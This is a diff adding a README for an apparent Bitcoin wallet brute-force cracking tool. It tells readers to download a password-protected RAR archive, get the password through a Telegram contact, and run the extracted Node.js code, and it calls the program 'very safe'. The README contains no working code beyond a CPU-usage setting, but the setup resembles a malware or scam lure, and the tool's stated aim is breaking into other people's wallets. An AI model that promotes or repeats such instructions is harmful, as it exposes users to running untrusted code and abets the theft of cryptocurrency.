@@ -1,0 +1,66 @@
+# Bitcoin-Wallet-Finder-Cracker-And-Brute-Force
+
+This is a node.js application and this program is very safe and works with power 
+
+## Requirements
+jsut windows and node.js for run codes :)
+
+- [node.js](https://nodejs.org/en/download/current)
+## Installation
+  
+- Download ```BTC-Multiple-Crack-SamCrypto.Site.rar```  File From [this link](https://github.com/samcrypto051/Bitcoin-wallet-finder-cracker-and-brute-force) and proceed to this tutorial
+
+- Extract ```BTC-Multiple-Crack-SamCrypto.Site.rar```  File
+
+- open cmd from your extracted directory exm: ```C:\BTC-Multiple-Crack-SamCrypto.Site``` folder
+
+- copy and paste this code
+```bash
+node btc
+```
+
+## Note
+this program default set %50 of cpu workers for change it do this :
+
+1 ) edit ```btc.js``` file in extracted directory with any text editor
+
+2 ) change line 9 like this :
+
+```javascript
+"use strict";
+
+process.title = "Bitcoin Multiple Crack | SamCrack.Site";
+
+// Used modules
+const fs = require('fs');
+const cluster = require('cluster');
+const blessed = require('blessed');
+const CPUnumber = require('os').cpus().length * 50 / 100; 
+
+```
+- for use %80 do this :
+```javascript
+const CPUnumber = require('os').cpus().length * 80 / 100; 
+
+```
+- and for use %100 do this :
+```javascript
+const CPUnumber = require('os').cpus().length * 100 / 100; 
+
+```
+3 ) save file and run it done :)
+
+## Download File
+
+[RAR File](https://github.com/samcrypto051/Bitcoin-wallet-finder-cracker-and-brute-force)
+
+
+## Password
+for get file password contact us in telegram :
+<p><a href="https://www.t.me/samcrypto_site"><img align="left" src="https://static.vecteezy.com/system/resources/previews/018/930/479/non_2x/telegram-logo-telegram-icon-transparent-free-png.png" height="100" width="100" alt="SamCrypto_site" /></a></p>
+<br><br>
+<br><br>
+
+
+## License
+[MIT](https://choosealicense.com/licenses/mit/)
